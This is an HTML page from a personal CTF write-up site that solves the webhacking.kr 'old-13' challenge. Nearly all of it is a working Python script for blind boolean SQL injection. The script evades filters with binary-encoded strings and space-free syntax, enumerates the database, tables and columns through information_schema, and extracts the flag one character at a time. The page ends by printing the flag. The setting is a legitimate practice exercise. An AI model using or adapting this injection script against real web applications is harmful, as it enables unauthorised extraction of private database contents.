<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>old-13 | Avishai’s CTF Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="old-13" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="…" />
<meta property="og:description" content="…" />
<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/old-13.html" />
<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/old-13.html" />
<meta property="og:site_name" content="Avishai’s CTF Writeups" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="old-13" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"old-13","url":"http://localhost:4000/CTF_writeups/webhacking.kr/old-13.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/CTF_writeups/">
          <h1>Avishai's CTF Writeups</h1>
        </a>
        <h2>...</h2>

        <section id="downloads">
          
          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="webhacking-old-13-solution">Webhacking old-13 Solution</h1>

<p>Another sql injection.
Here i maid some fancy script, i should use it in the future.</p>

<p>[old-13]</p>
<pre><code class="language-scripts/old-13.py">import requests
import string
import time

import binascii
def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def string_to_binary(s):
    res = '0b'
    for c in s:
        res += (bin(int(binascii.hexlify(c.encode()),16))[2:]).rjust(8,'0')
    return res
#    return bin(int(binascii.hexlify(s.encode()),16))

# print(string_to_binary('^FLAG{$'))

URL = "https://webhacking.kr/challenge/web-10/index.php"
SESSION_ID = "215o6b6hh84u927ghaev4nucdo"
cookies = {'PHPSESSID':SESSION_ID}
params ={'no':''}

length_database = 7

# # find length of database name
for length_database in range(30):
    payload = f"IF(length(database())regexp({length_database}),1,0)"
    params['no'] = payload
    # print(str(i) + ' ' + payload)
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '&lt;td&gt;1&lt;/td&gt;' in response.text:
        break
print("length of database is: {0}".format(length_database))

# # find database name
database = "chall13"
i = 1
while len(database) &lt; length_database:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary = string_to_binary(('^'+database+c+'$').replace("_", r"\_"))
        payload = f"IF(substr(database(),1,{i})regexp(0b{binary}),1,0)"
        
        # print(f"{c}: {payload}")
        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '&lt;td&gt;1&lt;/td&gt;' in response.text:
            i += 1
            database += c
            print("database: " + database.ljust(length_database, '*'))
            # print(database)
            break



# now, lets find how much tables there are on our db
count = 2
for count in range(10):
    binary_database = string_to_binary((database).replace("_", r"_"))
    payload = f"IF((SELECT(COUNT(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL)))FROM(information_schema.tables))IN({count}),1,0)"
    # print('{0} : {1}'.format(i,payload))
    params['no'] = payload
    response = requests.get(URL,params=params, cookies=cookies)
    
    if '&lt;td&gt;1&lt;/td&gt;' in response.text:
        break
print("number of tables: {}".format(count))


# find length of minimum table
min_length = 13     
for min_length in range(50):
    binary_database = string_to_binary((database).replace("_", r"\_"))
    payload = f"IF((SELECT(LENGTH(MIN(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL))))FROM(information_schema.tables))IN({min_length}),1,0)"

    params['no'] = payload
    # print(str(i) + ' ' + payload)
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '&lt;td&gt;1&lt;/td&gt;' in response.text:
        break
print("length of min table is: {0}".format(min_length))


# find length of maximum table
max_length = 4
for max_length in range(50):
    binary_database = string_to_binary((database).replace("_", r"_"))
    payload = f"IF((SELECT(LENGTH(MAX(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL))))FROM(information_schema.tables))IN({max_length}),1,0)"

    params['no'] = payload
    # print('{0} : {1}'.format(i,payload))
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '&lt;td&gt;1&lt;/td&gt;' in response.text:
        break
print("length of max table is: {0}".format(max_length))

# now, need to find the minimum table name
table_min = 'flag_ab733768'
inx = 1
while len(table_min) &lt; min_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary_table = string_to_binary((table_min+c).replace("_", r"_"))
        binary_database = string_to_binary((database).replace("_", r"_"))
        payload = f"IF(SUBSTR((SELECT(MIN(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL)))FROM(information_schema.tables)),1,{inx})IN({binary_table}),1,0)"
        # print('{0} : {1}'.format(c,payload))

        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '&lt;td&gt;1&lt;/td&gt;' in response.text:
            inx += 1
            table_min += c
            print("min table: " + table_min.ljust(min_length, '*'))
            break
    else:
        print("failed to find min table")
        break


# now, need to find the maximum table name
table_max = 'list'
inx = 1
while len(table_max) &lt; max_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary_table = string_to_binary((table_max+c).replace("_", r"_"))
        binary_database = string_to_binary((database).replace("_", r"_"))
        payload = f"IF(SUBSTR((SELECT(MAX(IF((SELECT(table_schema)IN({binary_database})),table_name,NULL)))FROM(information_schema.tables)),1,{inx})IN({binary_table}),1,0)"
        # print('{0} : {1}'.format(c,payload))

        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '&lt;td&gt;1&lt;/td&gt;' in response.text:
            inx += 1
            table_max += c
            print("max table: " + table_max.ljust(max_length, '*'))
            break
    else:
        print("failed to find max table")
        break


# find number of columns in table min
table_name = table_min
count = 1
for count in range(10):
    binary_table = string_to_binary((table_name).replace("_", r"_"))

    payload = f"IF((SELECT(COUNT(IF((SELECT(table_name)IN({binary_table})),column_name,NULL)))FROM(information_schema.columns))IN({count}),1,0)"
    # print('{0} : {1}'.format(i,payload))
    params['no'] = payload
    response = requests.get(URL,params=params, cookies=cookies)
    
    if '&lt;td&gt;1&lt;/td&gt;' in response.text:
        break

print("number of columns in table {1}: {0}".format(count, table_name))


# find length of column
column_length = 13
for column_length in range(50):
    binary_table = string_to_binary((table_name).replace("_", r"_"))

    payload = f"IF((SELECT(LENGTH(MIN(IF((SELECT(table_name)IN({binary_table})),column_name,NULL))))FROM(information_schema.columns))IN({column_length}),1,0)"

    params['no'] = payload
    # print('{0} : {1}'.format(i,payload))
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '&lt;td&gt;1&lt;/td&gt;' in response.text:
        break
print("length of column is: {0}".format(column_length))


# now, find the columns name
table_column = 'flag_3a55b31d'
inx = 1
while len(table_column) &lt; column_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        binary_table = string_to_binary((table_name).replace("_", r"_"))
        binary_column = string_to_binary((table_column+c).replace("_", r"_"))

        payload = f"IF(SUBSTR((SELECT(MIN(IF((SELECT(table_name)IN({binary_table})),column_name,NULL)))FROM(information_schema.columns)),1,{inx})IN({binary_column}),1,0)"
        # print('{0} : {1}'.format(c,payload))


        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '&lt;td&gt;1&lt;/td&gt;' in response.text:
            inx += 1
            table_column += c
            print("column name: " + table_column.ljust(min_length, '*'))
            break
    else:
        print("failed to find column name")
        break

# find length of the flag
flag_length = 27
for flag_length in range(50):
    # binary_database = string_to_binary((database).replace("_", r"_"))  
    # binary_table = string_to_binary((table_name).replace("_", r"_"))
    binary_table = string_to_binary((database+"."+table_name).replace("_", r"_"))
    binary_column = string_to_binary((table_column).replace("_", r"_"))

    payload = f"IF((SELECT(LENGTH(MAX({table_column})))FROM({database}.{table_name}))IN({flag_length}),1,0)"

    params['no'] = payload
    # print('{0} : {1}'.format(i,payload))
    response = requests.get(URL,params=params, cookies=cookies)
    # print(response.text)
    
    if '&lt;td&gt;1&lt;/td&gt;' in response.text:
        break
print("length of flag is: {0}".format(flag_length))


# and after all, find the secret!
flag = ''
inx = 1
while len(flag) &lt; flag_length:    
    for c in string.ascii_letters+string.digits+"{"+"}"+"-"+"?"+"_" +'!'+'/':
        # binary_flag = string_to_binary((flag+c).replace("_", r"_"))
        binary_char = string_to_binary((c).replace("_", r"_"))
        # binary_database = string_to_binary((database).replace("_", r"_"))  
        # binary_table = string_to_binary((table_name).replace("_", r"_"))
        binary_table = string_to_binary((database+"."+table_name).replace("_", r"_"))
        binary_column = string_to_binary((table_column).replace("_", r"_"))

        # payload = f"IF(SUBSTR((SELECT(MAX({binary_column}))FROM({binary_table})),1,{inx})IN({binary_flag}),1,0)"
        payload = f"IF(ORD(SUBSTR((SELECT(MAX({table_column}))FROM({database}.{table_name})),{inx},1))IN(ORD({binary_char})),1,0)"
        # print('{0} : {1}'.format(c,payload))

        params['no'] = payload
        response = requests.get(URL,params=params, cookies=cookies)
        
        if '&lt;td&gt;1&lt;/td&gt;' in response.text:
            inx += 1
            flag += c
            print("flag: " + flag.ljust(flag_length, '*'))
            break
    else:
        print("finished! the flag is: {0}".format(flag))
        break

</code></pre>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{challenge13gummyclear}</code></em></strong></p>

      </section>
    </div>
  </body>
</html>
